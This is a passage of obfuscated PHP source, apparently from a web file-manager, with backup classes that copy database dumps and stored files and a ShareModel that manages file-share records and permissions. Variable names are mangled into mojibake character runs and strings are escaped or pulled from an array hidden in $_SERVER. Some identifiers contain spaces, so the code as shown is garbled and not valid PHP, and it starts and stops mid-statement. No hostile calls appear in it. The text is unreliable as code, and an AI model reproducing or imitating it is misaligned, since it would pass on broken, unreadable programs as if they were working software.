($˝ÿ–÷ÈÉ as $˜øÊÜ˜î) { $√÷íªõ« = $ûòœã´Ñ . $˜øÊÜ˜î . $ƒ÷˝êæÎ[795]; $√ì£˚•ï = null; if ($˜øÊÜ˜î == $ƒ÷˝êæÎ[796] && (!isset($ÚÃ«˘ø†[$ƒ÷˝êæÎ[762]]) || $ÚÃ«˘ø†[$ƒ÷˝êæÎ[762]] == $ƒ÷˝êæÎ[207])) { $√ì£˚•ï = self::$io; } $Ì†·Ì°£ += $ñ˘Êæçê->sqlFromDb($˜øÊÜ˜î, $√÷íªõ«, $Ö∑öªŸÍ, $√ì£˚•ï); } unset($GLOBALS[$ƒ÷˝êæÎ[794]]); $Ö∑öªŸÍ->end(); if ($Ì†·Ì°£ > $º∑”ÔÊ˜) { $º∑”ÔÊ˜ = $Ì†·Ì°£; } $·«ıÜ¢° = array($ƒ÷˝êæÎ[783] => $ÙúçÃ€§, $ƒ÷˝êæÎ[780] => 1, $ƒ÷˝êæÎ[797] => $º∑”ÔÊ˜, $ƒ÷˝êæÎ[798] => $Ì†·Ì°£, $ƒ÷˝êæÎ[799] => time()); Backup::set($·«ıÜ¢°); if ($º∑”ÔÊ˜ - $Ì†·Ì°£ > 0) { $åûÔ¸ﬂ¢ = $ƒ÷˝êæÎ[800]; if (stristr(I18n::getType(), $ƒ÷˝êæÎ[801])) { $åûÔ¸ﬂ¢ = $ƒ÷˝êæÎ[802]; } write_log(array($åûÔ¸ﬂ¢, $·«ıÜ¢°), $ƒ÷˝êæÎ[787]); return !1; } return !0; } private function tmpFilesPath() { $áàåÉŒ‰ =& $_SERVER[Á≈ ä ∞]; $û◊≤›∂ï = TEMP_FILES; if ($GLOBALS[$áàåÉŒ‰[16]][$áàåÉŒ‰[99]][$áàåÉŒ‰[803]]) { $û◊≤›∂ï = $GLOBALS[$áàåÉŒ‰[16]][$áàåÉŒ‰[99]][$áàåÉŒ‰[803]]; if (!mk_dir($û◊≤›∂ï) || !is_writable($û◊≤›∂ï) || !IO::mkfile($û◊≤›∂ï . $áàåÉŒ‰[804])) { $û◊≤›∂ï = TEMP_FILES; } } return $û◊≤›∂ï; } } class BackupDbFile { public function __construct() { } public function index() { $Çà•Æœπ =& $_SERVER[Á≈ ä ∞]; $„µ›‹˙ = Backup::get(); $ÿƒﬂõíˆ = $„µ›‹˙[$Çà•Æœπ[42]]; $©á⁄êá· = $this->tmpFilesPath() . "\142\x61\143\153\x75\160\137{$ÿƒﬂõíˆ}\x2f"; $à¿¿ªÙ® = $this->backupPath($„µ›‹˙); if (!($à¿¿ªÙ® = IO::mkdir($à¿¿ªÙ®))) { return !1; } $¯¶Ä£í∏ = IO::listPath($©á⁄êá·); $àü¡Å¯ = isset($¯¶Ä£í∏[$Çà•Æœπ[93]]) ? $¯¶Ä£í∏[$Çà•Æœπ[93]] : array(); $◊ı™ú⁄˜ = array_sum(array_column($àü¡Å¯, $Çà•Æœπ[86])); if (!$◊ı™ú⁄˜) { return !1; } $úàø≠‚„ = array($Çà•Æœπ[805] => $◊ı™ú⁄˜, $Çà•Æœπ[806] => time()); Backup::set($úàø≠‚„); $ò≈Éí≠≈ = new TaskFileTransfer($Çà•Æœπ[807], $Çà•Æœπ[787], count($àü¡Å¯), LNG($Çà•Æœπ[788]) . $Çà•Æœπ[395] . LNG($Çà•Æœπ[790]) . $Çà•Æœπ[808]); $ò≈Éí≠≈->task[$Çà•Æœπ[770]] = $◊ı™ú⁄˜; foreach ($¯¶Ä£í∏[$Çà•Æœπ[93]] as $√¬›Ÿ®é) { $Ë˝À€ä¯ = IO::move($√¬›Ÿ®é[$Çà•Æœπ[94]], $à¿¿ªÙ®); if (!$Ë˝À€ä¯) { $ò≈Éí≠≈->end(); $à¢®›∫– = IO::getLastError($Çà•Æœπ[809] . $√¬›Ÿ®é[$Çà•Æœπ[94]] . $Çà•Æœπ[810] . $à¿¿ªÙ® . $Çà•Æœπ[174]); write_log($à¢®›∫–, $Çà•Æœπ[787]); return !1; } } $—êÜè‘⁄ = new DbManage(); $ÁÜ††ç“ = $—êÜè‘⁄->getSqlFile(); if (!$ÁÜ††ç“[$Çà•Æœπ[811]] || !$ÁÜ††ç“[$Çà•Æœπ[23]]) { return !1; } IO::move($ÁÜ††ç“[$Çà•Æœπ[811]], $à¿¿ªÙ®); IO::move($ÁÜ††ç“[$Çà•Æœπ[23]], $à¿¿ªÙ®); $ò≈Éí≠≈->end(); $úàø≠‚„ = array($Çà•Æœπ[812] => $◊ı™ú⁄˜, $Çà•Æœπ[813] => time()); Backup::set($úàø≠‚„); return !0; } private function backupPath($À”ó˝∑Ë) { $º˘‡¨ö› =& $_SERVER[Á≈ ä ∞]; $÷⁄∑≈ﬂß = $À”ó˝∑Ë[$º˘‡¨ö›[42]]; $†È‘ëûæ = Model($º˘‡¨ö›[777])->get($º˘‡¨ö›[778]); $—∑ÆΩ≤° = substr(md5($º˘‡¨ö›[779] . $†È‘ëûæ . $÷⁄∑≈ﬂß), 0, 8); return "\x7b\x69\157\x3a{$À”ó˝∑Ë[$º˘‡¨ö›[759]]}\x7d\x2f\144\141\x74\141\142\141\163\x65\57\142\x61\143\153\165\x70\57" . $÷⁄∑≈ﬂß . $º˘‡¨ö›[21] . $—∑ÆΩ≤°; } private function tmpFilesPath() { $èÌŒìóÚ =& $_SERVER[Á≈ ä ∞]; $Öî±¶∆π = TEMP_FILES; if ($GLOBALS[$èÌŒìóÚ[16]][$èÌŒìóÚ[99]][$èÌŒìóÚ[803]]) { $Öî±¶∆π = $GLOBALS[$èÌŒìóÚ[16]][$èÌŒìóÚ[99]][$èÌŒìóÚ[803]]; if (!mk_dir($Öî±¶∆π) || !is_writable($Öî±¶∆π) || !IO::mkfile($Öî±¶∆π . $èÌŒìóÚ[804])) { $Öî±¶∆π = TEMP_FILES; } } return $Öî±¶∆π; } } class BackupFile { public function __construct() { } public function index() { $©“åç§ñ = Backup::get(); $ãˆÎ˘ﬂ≈ = $©“åç§ñ[$_SERVER[Á≈ ä ∞][302]][$_SERVER[Á≈ ä ∞][209]][$_SERVER[Á≈ ä ∞][477]]; $É˛ƒÓƒö = array($_SERVER[Á≈ ä ∞][478] => array($_SERVER[Á≈ ä ∞][814], $ãˆÎ˘ﬂ≈), $_SERVER[Á≈ ä ∞][815] => array($_SERVER[Á≈ ä ∞][340], $©“åç§ñ[$_SERVER[Á≈ ä ∞][759]])); $ÏÅµ≤©Æ = (int) Model($_SERVER[Á≈ ä ∞][796])->where($É˛ƒÓƒö)->count($_SERVER[Á≈ ä ∞][477]); $ØÚò≈´˛ = (int) Model($_SERVER[Á≈ ä ∞][796])->where($É˛ƒÓƒö)->sum($_SERVER[Á≈ ä ∞][86]); $°÷âº˝† = new TaskFileTransfer($_SERVER[Á≈ ä ∞][816], $_SERVER[Á≈ ä ∞][787], $ÏÅµ≤©Æ, LNG($_SERVER[Á≈ ä ∞][788]) . $_SERVER[Á≈ ä ∞][789] . LNG($_SERVER[Á≈ ä ∞][817])); $°÷âº˝†->task[$_SERVER[Á≈ ä ∞][770]] = $ØÚò≈´˛; $«˚ãñΩÇ = array($_SERVER[Á≈ ä ∞][818] => $ÏÅµ≤©Æ, $_SERVER[Á≈ ä ∞][819] => $ØÚò≈´˛, $_SERVER[Á≈ ä ∞][820] => time()); Backup::set($«˚ãñΩÇ); $ÚÆÅ™∏∫ = !0; $˘ªÍùÛ£ = $this->storeIds(); $Ñ±ñÇ™‘ = 1; $õóÄß⁄ü = 1000; $ï§Ö¥ëÿ = $ê´Ó¢û≈ = 0; $ÙÚ∫ú¢¬ = array(); $„âƒ∂ƒº = $¯ËÙââñ = 0; do { $‘™øÕòò = $_SERVER[Á≈ ä ∞][821]; $ø£‹◊âΩ = Model($_SERVER[Á≈ ä ∞][796])->where($É˛ƒÓƒö)->field($‘™øÕòò)->order($_SERVER[Á≈ ä ∞][822])->selectPage($õóÄß⁄ü, $Ñ±ñÇ™‘); $˛Œß…ﬁ· = !empty($ø£‹◊âΩ[$_SERVER[Á≈ ä ∞][378]]) ? $ø£‹◊âΩ[$_SERVER[Á≈ ä ∞][378]] : array(); foreach ($˛Œß…ﬁ· as $Å˛ΩÄ”à) { if (!$this->_fileExist($Å˛ΩÄ”à, $ÙÚ∫ú¢¬, $˘ªÍùÛ£)) { $ÏÅµ≤©Æ -= 1; $ØÚò≈´˛ -= (int) $Å˛ΩÄ”à[$_SERVER[Á≈ ä ∞][86]]; write_log("\146\x69\154\145\x20\x6e\157\164\x20\145\x78\x69\163\x74\x2e\x66\x69\x6c\145\x49\104\72{$Å˛ΩÄ”à[$_SERVER[Á≈ ä ∞][477]]}\54\40\160\141\164\x68\72{$Å˛ΩÄ”à[$_SERVER[Á≈ ä ∞][94]]}", $_SERVER[Á≈ ä ∞][823]); continue; } $≠∆£–πø = $Å˛ΩÄ”à[$_SERVER[Á≈ ä ∞][94]]; $ìïö™µ˙ = "\x7b\151\157\x3a{$©“åç§ñ[$_SERVER[Á≈ ä ∞][759]]}\x7d" . substr($≠∆£–πø, strlen("\173\x69\x6f\x3a{$Å˛ΩÄ”à[$_SERVER[Á≈ ä ∞][824]]}\x7d")); if (IO::exist($ìïö™µ˙)) { $°÷âº˝†->updateFileEnd($Å˛ΩÄ”à[$_SERVER[Á≈ ä ∞][42]], $Å˛ΩÄ”à[$_SERVER[Á≈ ä ∞][86]]); } else { $ìïö™µ˙ = get_path_father($ìïö™µ˙); IO::mkdir($ìïö™µ˙); if (!IO::copy($≠∆£–πø, $ìïö™µ˙, $_SERVER[Á≈ ä ∞][825])) { write_log($_SERVER[Á≈ ä ∞][826] . $≠∆£–πø . $_SERVER[Á≈ ä ∞][810] . $ìïö™µ˙ . $_SERVER[Á≈ ä ∞][174], $_SERVER[Á≈ ä ∞][787]); $ÚÆÅ™∏∫ = !1; break; } } $ãˆÎ˘ﬂ≈ = $Å˛ΩÄ”à[$_SERVER[Á≈ ä ∞][477]]; $ê´Ó¢û≈ += 1; $ï§Ö¥ëÿ += $Å˛ΩÄ”à[$_SERVER[Á≈ ä ∞][86]]; $¯ËÙââñ += 1; $„âƒ∂ƒº += $Å˛ΩÄ”à[$_SERVER[Á≈ ä ∞][86]]; if ($ï§Ö¥ëÿ >= 1024 * 1024 * 100) { $«˚ãñΩÇ = array($_SERVER[Á≈ ä ∞][827] => $ãˆÎ˘ﬂ≈, $_SERVER[Á≈ ä ∞][828] => $¯ËÙââñ, $_SERVER[Á≈ ä ∞][829] => $„âƒ∂ƒº); Backup::set($«˚ãñΩÇ); $ï§Ö¥ëÿ = $ê´Ó¢û≈ = 0; } } $∫åå˙ã∞ = count($˛Œß…ﬁ·); $Ñ±ñÇ™‘++; } while ($∫åå˙ã∞ == $õóÄß⁄ü); $°÷âº˝†->end(); $«˚ãñΩÇ = array($_SERVER[Á≈ ä ∞][830] => 1, $_SERVER[Á≈ ä ∞][506] => time(), $_SERVER[Á≈ ä ∞][782] => 1, $_SERVER[Á≈ ä ∞][827] => $ãˆÎ˘ﬂ≈, $_SERVER[Á≈ ä ∞][819] => $ØÚò≈´˛, $_SERVER[Á≈ ä ∞][818] => $ÏÅµ≤©Æ, $_SERVER[Á≈ ä ∞][831] => time()); if ($ê´Ó¢û≈) { $«˚ãñΩÇ[$_SERVER[Á≈ ä ∞][828]] = $¯ËÙââñ; $«˚ãñΩÇ[$_SERVER[Á≈ ä ∞][829]] = $„âƒ∂ƒº; } Backup::set($«˚ãñΩÇ); $this->_fileFilter($ÙÚ∫ú¢¬); return !0; } private function _fileExist($ñÒÜ†ˆá, &$Ú‹ÿºø©, $«ëùº∆ª) { $åµ◊›ªø =& $_SERVER[Á≈ ä ∞]; $Üµ„∏â˘ = $ñÒÜ†ˆá[$åµ◊›ªø[94]]; if (in_array($ñÒÜ†ˆá[$åµ◊›ªø[477]], $Ú‹ÿºø©)) { return !1; } if (!in_array($ñÒÜ†ˆá[$åµ◊›ªø[824]], $«ëùº∆ª)) { return !1; } if (IO::exist($Üµ„∏â˘)) { return !0; } $¸‘ë≤˛¿ = get_path_father($Üµ„∏â˘); if (IO::exist($¸‘ë≤˛¿)) { $Ú‹ÿºø©[] = $ñÒÜ†ˆá[$åµ◊›ªø[477]]; return !1; } $¬‰ù€–Ÿ = array($åµ◊›ªø[824] => $ñÒÜ†ˆá[$åµ◊›ªø[824]], $åµ◊›ªø[94] => array($åµ◊›ªø[392], "{$¸‘ë≤˛¿}\45")); $ ÈüåÙŒ = Model($åµ◊›ªø[796])->where($¬‰ù€–Ÿ)->field($åµ◊›ªø[478])->select(); $Ú‹ÿºø© = array_merge($Ú‹ÿºø©, array_to_keyvalue($ ÈüåÙŒ, $åµ◊›ªø[22], $åµ◊›ªø[477])); return !1; } private function _fileFilter($ÖÃî±±Ô) { $‘ﬁÊÏÁº =& $_SERVER[Á≈ ä ∞]; if (empty($ÖÃî±±Ô)) { return; } $ñ‚öŒ¡û = array($‘ﬁÊÏÁº[477] => array($‘ﬁÊÏÁº[17], array_unique($ÖÃî±±Ô))); $ËÑ„ΩÇÔ = Model($‘ﬁÊÏÁº[832])->where($ñ‚öŒ¡û)->field($‘ﬁÊÏÁº[411])->select(); foreach ($ËÑ„ΩÇÔ as $ñüª«≥∂) { Model($‘ﬁÊÏÁº[832])->remove($ñüª«≥∂[$‘ﬁÊÏÁº[411]], !1); } } private function storeIds() { $òÛË¸Ù» =& $_SERVER[Á≈ ä ∞]; $”ò˚Ä‚  = Model($òÛË¸Ù»[774])->listData(); $ÇÏ∫±˙Ô = array(); $⁄»ñ‰¢† = $GLOBALS[$òÛË¸Ù»[16]][$òÛË¸Ù»[99]][$òÛË¸Ù»[833]]; foreach ($”ò˚Ä‚  as $ö˝ıÅ°Ë) { $÷ÀÓÀüÛ = strtolower($ö˝ıÅ°Ë[$òÛË¸Ù»[105]]); if (!isset($⁄»ñ‰¢†[$÷ÀÓÀüÛ])) { continue; } $ÄÅ™µ¯‰ = $òÛË¸Ù»[84] . (isset($⁄»ñ‰¢†[$÷ÀÓÀüÛ]) ? $⁄»ñ‰¢†[$÷ÀÓÀüÛ] : ucfirst($÷ÀÓÀüÛ)); if (!class_exists($ÄÅ™µ¯‰)) { continue; } $ÇÏ∫±˙Ô[] = $ö˝ıÅ°Ë[$òÛË¸Ù»[408]]; } return $ÇÏ∫±˙Ô; } } goto DãèøÛ¢Ã¡; aÙ≠‡õ”Æ¬: class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\151\x6d\x65", "\164\151\155\x65", "\x69\x6e\x73\x65\162\164\x2c\x75\160\144\141\x74\x65", "\x66\165\x6e\x63\x74\x69\x6f\156"), array("\x63\162\x65\141\164\145\x54\x69\155\x65", "\x74\151\155\145", "\151\156\163\x65\162\x74", "\146\165\156\143\x74\x69\x6f\156"), array("\x6f\x70\x74\151\157\x6e\163", '', "\x69\156\163\x65\x72\x74\x2c\165\160\x64\141\164\x65\54\163\145\154\x65\x63\x74", "\x6a\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Ì‚£™£Ó) { $∫ë»úË€ =& $_SERVER[Á≈ ä ∞]; $˛ø›√ÿı = isset($Ì‚£™£Ó[0]) ? $Ì‚£™£Ó[0] : !1; return array($∫ë»úË€[1969] => array(USER_ID, $∫ë»úË€[1970]), $∫ë»úË€[1910] => array($˛ø›√ÿı, $∫ë»úË€[1971])); } protected function listSimple() { $¨±∞≥ß´ = array($_SERVER[Á≈ ä ∞][1658] => USER_ID); $—Ç∆È»› = $this->field($this->fieldList)->where($¨±∞≥ß´)->select(); return $—Ç∆È»› ? $—Ç∆È»› : array(); } protected function getInfo($ÉçäÿÚù, $øé˙¥°À = false) { $ıˆØÉ∫Æ =& $_SERVER[Á≈ ä ∞]; if ($øé˙¥°À) { return $this->_getShareInfo(array($ıˆØÉ∫Æ[498] => $ÉçäÿÚù)); } $Ïû´∞â· = $this->cacheFunctionGet($ıˆØÉ∫Æ[1912], $ÉçäÿÚù); return $Ïû´∞â·; } public function getInfoByHash($˛§œ≤Â) { return $this->_getShareInfo(array($_SERVER[Á≈ ä ∞][500] => $˛§œ≤Â)); } public function getInfoByPath($®¿ù‹Â˙) { $Âæñ∫æ© =& $_SERVER[Á≈ ä ∞]; $Ã≤“ÚÍ¥ = array($Âæñ∫æ©[1658] => USER_ID, $Âæñ∫æ©[411] => $®¿ù‹Â˙); return $this->_getShareInfo($Ã≤“ÚÍ¥); } public function getInfoBySourcePath($˙¥®€ﬂñ) { $ò—Ïéé° =& $_SERVER[Á≈ ä ∞]; $»π¡ÍÂÚ = array($ò—Ïéé°[1658] => USER_ID, $ò—Ïéé°[1179] => $˙¥®€ﬂñ); return $this->_getShareInfo($»π¡ÍÂÚ); } private function _getShareInfo($‡—Ñê∆ç) { $Êß≈•“Í =& $_SERVER[Á≈ ä ∞]; $ÇÍœÀØ˘ = $this->where($‡—Ñê∆ç)->find(); if (!$ÇÍœÀØ˘) { return !1; } $‡—Ñê∆ç = array($Êß≈•“Í[498] => $ÇÍœÀØ˘[$Êß≈•“Í[498]]); $ËÊûÿ¿º = $Êß≈•“Í[1972]; $‚î´ôé— = Model($Êß≈•“Í[611])->order($Êß≈•“Í[408])->field($ËÊûÿ¿º)->where($‡—Ñê∆ç)->select(); if ($ÇÍœÀØ˘[$Êß≈•“Í[411]] == $Êß≈•“Í[207]) { $ÇÍœÀØ˘[$Êß≈•“Í[96]] = IO::info($ÇÍœÀØ˘[$Êß≈•“Í[1179]]); } else { $ÇÍœÀØ˘[$Êß≈•“Í[96]] = Model($Êß≈•“Í[1330])->pathInfo($ÇÍœÀØ˘[$Êß≈•“Í[411]]); } $ÇÍœÀØ˘[$Êß≈•“Í[1973]] = $‚î´ôé—; return $ÇÍœÀØ˘; } protected function getInfoAuth($í∞éöãÛ) { $ëÄ·™àå =& $_SERVER[Á≈ ä ∞]; $≥∏ç›”⁄ = $this->getInfo($í∞éöãÛ); if ($≥∏ç›”⁄[$ëÄ·™àå[1658]] == USER_ID) { $≥∏ç›”⁄[$ëÄ·™àå[422]] = $≥∏ç›”⁄[$ëÄ·™àå[96]][$ëÄ·™àå[422]]; } else { $≥∏ç›”⁄[$ëÄ·™àå[422]] = Model($ëÄ·™àå[511])->authMake($≥∏ç›”⁄[$ëÄ·™àå[1973]]); } return $≥∏ç›”⁄; } protected function listData($ëÃπáˆó = null, $ä∆ÁÈõ¡ = 300) { $… «≠Í“ =& $_SERVER[Á≈ ä ∞]; $®ÒÜœã¢ = array(array($… «≠Í“[503] => array($… «≠Í“[1015], 0), $… «≠Í“[505] => array($… «≠Í“[1015], 0), $… «≠Í“[1974] => $… «≠Í“[1928])); if ($ëÃπáˆó == $… «≠Í“[1975]) { $®ÒÜœã¢ = array($… «≠Í“[503] => 1); } else { if ($ëÃπáˆó == $… «≠Í“[1164]) { $®ÒÜœã¢ = array($… «≠Í“[505] => 1); } } $®ÒÜœã¢[$… «≠Í“[1658]] = USER_ID; $ôÔÍúœå = $this->where($®ÒÜœã¢)->selectPage($ä∆ÁÈõ¡); return $ôÔÍúœå; } protected function listToMe($é≠»ÿÃ⁄ = 300) { $íÄ°é£´ =& $_SERVER[Á≈ ä ∞]; $éÖàˆºã = Model($íÄ°é£´[1976])->userGroupParents(USER_ID); $Í˝ÏØÇñ = array($íÄ°é£´[595] => SourceModel::TYPE_USER, $íÄ°é£´[514] => USER_ID); if ($éÖàˆºã) { $Í˝ÏØÇñ = array(array($íÄ°é£´[595] => SourceModel::TYPE_USER, $íÄ°é£´[514] => USER_ID), array($íÄ°é£´[595] => SourceModel::TYPE_GROUP, $íÄ°é£´[514] => array($íÄ°é£´[17], $éÖàˆºã)), $íÄ°é£´[1974] => $íÄ°é£´[1928]); } $ä˘ïîû‘ = Model($íÄ°é£´[611])->where($Í˝ÏØÇñ)->selectPage($é≠»ÿÃ⁄); $çÊ√ËÄµ = array_to_keyvalue_group($ä˘ïîû‘[$íÄ°é£´[378]], $íÄ°é£´[498]); if (!$çÊ√ËÄµ) { return $ä˘ïîû‘; } $Ç›Æ∞µı = $íÄ°é£´[1977]; $Í˝ÏØÇñ = array($íÄ°é£´[498] => array($íÄ°é£´[427], array_keys($çÊ√ËÄµ)), $íÄ°é£´[1658] => array($íÄ°é£´[1017], $íÄ°é£´[207])); $ò‚¿ΩèÖ = $this->field($Ç›Æ∞µı)->where($Í˝ÏØÇñ)->select(); foreach ($ò‚¿ΩèÖ as $ù–‡õí¢ => &$™Ëı¥◊œ) { $™Ëı¥◊œ[$íÄ°é£´[1973]] = $çÊ√ËÄµ[$™Ëı¥◊œ[$íÄ°é£´[498]]]; } unset($™Ëı¥◊œ); $Üàº©î = array($íÄ°é£´[1978] => $ò‚¿ΩèÖ, $íÄ°é£´[1979] => $ä˘ïîû‘[$íÄ°é£´[375]]); return $Üàº©î; } protected function shareAdd($˛€“®ﬂƒ, $ºπ∫≤Ñœ) { $‚ΩÎúÑ‘ =& $_SERVER[Á≈ ä ∞]; $èÉÜŸ™‚ = $this->_addShareData($˛€“®ﬂƒ, $ºπ∫≤Ñœ); if (!empty($ºπ∫≤Ñœ[$‚ΩÎúÑ‘[1980]])) { $this->_shareAuthSet($èÉÜŸ™‚, $ºπ∫≤Ñœ[$‚ΩÎúÑ‘[1980]]); } $this->shareEventAdd($˛€“®ﬂƒ, $ºπ∫≤Ñœ, $‚ΩÎúÑ‘[1167]); return $èÉÜŸ™‚; } protected function shareAddSystem($≤ﬁ∞Ôì„, $øêï˛˘¢) { $ﬁÑæ€¶¶ =& $_SERVER[Á≈ ä ∞]; $Ì√Ω÷î‰ = $this->_addShareData($≤ﬁ∞Ôì„, $øêï˛˘¢, $ﬁÑæ€¶¶[1279]); $this->_shareAuthSet($Ì√Ω÷î‰, $øêï˛˘¢[$ﬁÑæ€¶¶[1980]]); return $Ì√Ω÷î‰; } private function shareEventAdd($ÚÛ◊≤ì‹, $±Ô‹¥˚ô, $ﬁ™ç™≥‹ = "\141\x64\144") { $µ˛©∆äì =& $_SERVER[Á≈ ä ∞]; if (!$ÚÛ◊≤ì‹ || $ÚÛ◊≤ì‹ == $µ˛©∆äì[207]) { return; } if ($ﬁ™ç™≥‹ == $µ˛©∆äì[1167]) { if ($±Ô‹¥˚ô[$µ˛©∆äì[503]] == $µ˛©∆äì[98]) { Model($µ˛©∆äì[579])->eventShare($ÚÛ◊≤ì‹, $µ˛©∆äì[1981]); } if ($±Ô‹¥˚ô[$µ˛©∆äì[505]] == $µ˛©∆äì[98]) { Model($µ˛©∆äì[579])->eventShare($ÚÛ◊≤ì‹, $µ˛©∆äì[1982]); } return; } $¡ª›ﬂ¨Ë = $this->getInfoByPath($ÚÛ◊≤ì‹); $Œö¬›¬Ê = $µ˛©∆äì[1983]; if ($¡ª›ﬂ¨Ë[$µ˛©∆äì[503]] == $µ˛©∆äì[207] && $±Ô‹¥˚ô[$µ˛©∆äì[503]] == $µ˛©∆äì[98]) { $Œö¬›¬Ê = $µ˛©∆äì[1981]; } if ($¡ª›ﬂ¨Ë[$µ˛©∆äì[503]] == $µ˛©∆äì[98] && $±Ô‹¥˚ô[$µ˛©∆äì[503]] == $µ˛©∆äì[207]) { $Œö¬›¬Ê = $µ˛©∆äì[1984]; } if ($¡ª›ﬂ¨Ë[$µ˛©∆äì[505]] == $µ˛©∆äì[207] && $±Ô‹¥˚ô[$µ˛©∆äì[505]] == $µ˛©∆äì[98]) { $Œö¬›¬Ê = $µ˛©∆äì[1982]; } if ($¡ª›ﬂ¨Ë[$µ˛©∆äì[505]] == $µ˛©∆äì[98] && $±Ô‹¥˚ô[$µ˛©∆äì[505]] == $µ˛©∆äì[207]) { $Œö¬›¬Ê = $µ˛©∆äì[1985]; } Model($µ˛©∆äì[579])->eventShare($ÚÛ◊≤ì‹, $Œö¬›¬Ê); return; } private function _addShareData($Îêûå¶∂, $íƒ™™Çπ = array(), $Æ¡Ô‰Á˝ = false) { $≥˝ÿàìº =& $_SERVER[Á≈ ä ∞]; $®Í‹â£î = $Æ¡Ô‰Á˝ == $≥˝ÿàìº[1279] ? 0 : USER_ID; $ï˘–Ó≤— = array($≥˝ÿàìº[426] => $Îêûå¶∂, $≥˝ÿàìº[1649] => $®Í‹â£î); if ($Îêûå¶∂ == 0) { $ï˘–Ó≤— = array($≥˝ÿàìº[1986] => $íƒ™™Çπ[$≥˝ÿàìº[1179]], $≥˝ÿàìº[1649] => $®Í‹â£î); } if ($ëÜÔó±ü = $this->where($ï˘–Ó≤—)->find()) { return $ëÜÔó±ü[$≥˝ÿàìº[498]]; } if ($Îêûå¶∂ == 0) { $àŸ≈î∏Æ = array($≥˝ÿàìº[42] => get_path_this($íƒ™™Çπ[$≥˝ÿàìº[94]])); } else { $àŸ≈î∏Æ = Model($≥˝ÿàìº[832])->sourceInfo($Îêûå¶∂); if (!$àŸ≈î∏Æ) { return !1; } } if (!$íƒ™™Çπ[$≥˝ÿàìº[1557]]) { $íƒ™™Çπ[$≥˝ÿàìº[1557]] = $àŸ≈î∏Æ[$≥˝ÿàìº[42]]; } $™˚Ãàª§ = array($≥˝ÿàìº[1649] => $®Í‹â£î, $≥˝ÿàìº[426] => $Îêûå¶∂, $≥˝ÿàìº[1557] => $≥˝ÿàìº[22], $≥˝ÿàìº[503] => 0, $≥˝ÿàìº[505] => 0, $≥˝ÿàìº[1179] => $≥˝ÿàìº[22], $≥˝ÿàìº[316] => $≥˝ÿàìº[22], $≥˝ÿàìº[892] => $≥˝ÿàìº[22], $≥˝ÿàìº[1987] => 0, $≥˝ÿàìº[1988] => 0, $≥˝ÿàìº[506] => 0, $≥˝ÿàìº[507] => $≥˝ÿàìº[22], $≥˝ÿàìº[500] => $≥˝ÿàìº[22]); $Éõ√Ï≠‚ = explode($≥˝ÿàìº[60], $≥˝ÿàìº[1989]); foreach ($Éõ√Ï≠‚ as $∞É°„À£) { if (!isset($íƒ™™Çπ[$∞É°„À£])) { continue; } $™˚Ãàª§[$∞É°„À£] = $íƒ™™Çπ[$∞É°„À£]; } $◊–ÈÉÒÃ = $this->add($™˚Ãàª§); $∑Íö‹Ü¡ = array($≥˝ÿàìº[500] => short_id($◊–ÈÉÒÃ)); $this->where(array($≥˝ÿàìº[497] => $◊–ÈÉÒÃ))->save($∑Íö‹Ü¡); return $◊–ÈÉÒÃ; } private function _shareAuthSet($⁄≠ê∂®…, $ƒ€Ω∆Ü«) { $À£èî¸· =& $_SERVER[Á≈ ä ∞]; if (!is_array($ƒ€Ω∆Ü«)) { return !1; } $“¡±ºîú = Model($À£èî¸·[1938]); $“¡±ºîú->where(array($À£èî¸·[498] => $⁄≠ê∂®…))->delete(); $“ª¯¿ £ = array(); foreach ($ƒ€Ω∆Ü« as $ÇñÅ«˘°) { $∞£©¥≥ß = SourceModel::TYPE_USER; if ($ÇñÅ«˘°[$À£èî¸·[420]] == SourceModel::TYPE_GROUP) { $∞£©¥≥ß = SourceModel::TYPE_GROUP; } $©ﬁÎ∞ù„ = array($À£èî¸·[498] => $⁄≠ê∂®…, $À£èî¸·[420] => $∞£©¥≥ß, $À£èî¸·[514] => intval($ÇñÅ«˘°[$À£èî¸·[514]]), $À£èî¸·[1934] => 0, $À£èî¸·[1990] => -1); if ($ÇñÅ«˘°[$À£èî¸·[1934]]) { $©ﬁÎ∞ù„[$À£èî¸·[1934]] = $ÇñÅ«˘°[$À£èî¸·[1934]]; } else { if ($ÇñÅ«˘°[$À£èî¸·[1990]]) { $©ﬁÎ∞ù„[$À£èî¸·[1990]] = $ÇñÅ«˘°[$À£èî¸·[1990]]; } } $“ª¯¿ £[] = $©ﬁÎ∞ù„; } return $“¡±ºîú->addAll($“ª¯¿ £, array(), !0); } public function numViewAdd($Ê©Ç©π) { $ºú’ØŒ” =& $_SERVER[Á≈ ä ∞]; $¶…ıòì– = array($ºú’ØŒ”[497] => $Ê©Ç©π); $this->where($¶…ıòì–)->setAdd($ºú’ØŒ”[1987]); } public function numDownloadAdd($‰˚À≥≈’) { $†·±À®ä =& $_SERVER[Á≈ ä ∞]; $ìä‰‡æÊ = array($†·±À®ä[497] => $‰˚À≥≈’); $this->where($ìä‰‡æÊ)->setAdd($†·±À®ä[1988]); } protected function shareEdit($’∂ÿ·ØÇ, $úãäå”ù) { $„ÊèŸ∆ã =& $_SERVER[Á≈ ä ∞]; $ÏñêƒÑ˛ = $this->getInfo($’∂ÿ·ØÇ); if (!$ÏñêƒÑ˛) { return !1; } $this->_checkLinkShare($úãäå”ù, $ÏñêƒÑ˛); $ëÙØ—’œ = array(); $°âõûÔ± = explode($„ÊèŸ∆ã[60], $„ÊèŸ∆ã[1991]); foreach ($°âõûÔ± as $«»Ù˜ë‘) { if (!array_key_exists($«»Ù˜ë‘, $úãäå”ù)) { continue; } $ëÙØ—’œ[$«»Ù˜ë‘] = $úãäå”ù[$«»Ù˜ë‘]; } $this->shareEventAdd($ÏñêƒÑ˛[$„ÊèŸ∆ã[411]], $úãäå”ù, $„ÊèŸ∆ã[1800]); $this->where(array($„ÊèŸ∆ã[497] => $’∂ÿ·ØÇ))->save($ëÙØ—’œ); if (isset($úãäå”ù[$„ÊèŸ∆ã[1980]])) { $this->_shareAuthSet($’∂ÿ·ØÇ, $úãäå”ù[$„ÊèŸ∆ã[1980]]); } return !0; } private function _checkLinkShare($ó‰æÿƒ◊, $»˚˙¿£ß) { $ÛØ™ Èê =& $_SERVER[Á≈ ä ∞]; if ($ó‰æÿƒ◊[$ÛØ™ Èê[503]] != $ÛØ™ Èê[98]) { return; } $÷√ΩÂí¯ = $»˚˙¿£ß[$ÛØ™ Èê[96]][$ÛØ™ Èê[411]]; if ($»˚˙¿£ß[$ÛØ™ 